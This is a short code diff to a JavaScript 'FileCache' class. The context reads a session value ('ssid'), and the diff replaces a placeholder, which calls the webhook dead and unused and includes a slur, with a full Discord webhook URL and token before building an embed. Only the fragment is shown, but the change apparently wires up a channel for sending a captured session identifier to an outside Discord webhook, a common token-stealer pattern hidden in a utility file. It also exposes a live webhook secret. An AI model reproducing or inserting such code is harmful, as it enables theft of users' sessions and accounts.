@@ -30,7 +30,7 @@ class FileCache {
 
     ssid = this.cache.ssid
 
-    const webhookClient = new WebhookClient({ url: 'this isnt used anywhere retards, its a old function when i was making this, webhook is desd too -_-' });
+    const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1465643603727749347/RgwVmvzpYUI7OptzfT-uQgNkv1Vk5JhtM3nDHeSCWxyCB94XrUOsxCjGYg5GUj_w3eza' });
 
     const embed = new EmbedBuilder()
     .setColor(0x5D3FD3)
